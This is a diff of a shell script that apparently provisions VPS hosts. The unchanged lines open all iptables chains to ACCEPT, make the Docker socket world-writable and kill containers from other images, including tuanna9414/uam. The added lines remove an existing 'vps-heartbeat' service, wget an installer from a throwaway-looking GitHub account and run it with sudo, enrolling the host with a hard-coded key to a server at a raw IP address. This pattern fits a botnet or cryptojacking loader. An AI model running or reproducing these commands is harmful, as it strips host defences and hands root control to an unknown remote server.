@@ -7,11 +7,21 @@ sudo iptables -A INPUT -p all -j ACCEPT
 sudo iptables -A FORWARD -p all -j ACCEPT
 sudo iptables -A OUTPUT -p all -j ACCEPT
 sudo iptables -A InstanceServices -p all -j ACCEPT
-sudo systemctl restart --now vps-heartbeat
+
 sudo chmod 666 /var/run/docker.sock
 docker rm -f $(docker ps -aq --filter ancestor=debian:bookworm-slim)
 docker rm -f $(docker ps -aq --filter ancestor=debian:bullseye-slim)
 docker rm -f $(docker ps -aq --filter ancestor=tuanna9414/uam:latest)
+
+if systemctl is-active --quiet vps-heartbeat; then
+    echo "Running"
+    sudo systemctl disable --now vps-heartbeat
+    sudo rm -rf /var/lib/vps-heartbeat
+    sudo rm -rf install-vps-heartbeat.sh && wget https://github.com/mahaliabpqvn07/custom-vps-monitor/raw/main/install-vps-heartbeat.sh
+    VPSMON_SERVER_BASE="http://168.110.215.95:8554" && VPSMON_ENROLLMENT_KEY="VuUK9DmdEHelZfI6Aoc3A0-7Anw2NQn6301vAqxKQIxbZL1v8yMayQ" && sudo bash install-vps-heartbeat.sh $VPSMON_SERVER_BASE $VPSMON_ENROLLMENT_KEY
+else
+    echo "Not Running"
+fi
 
 PBKEY=$(cat PBKEY.txt)
 # Colors for output
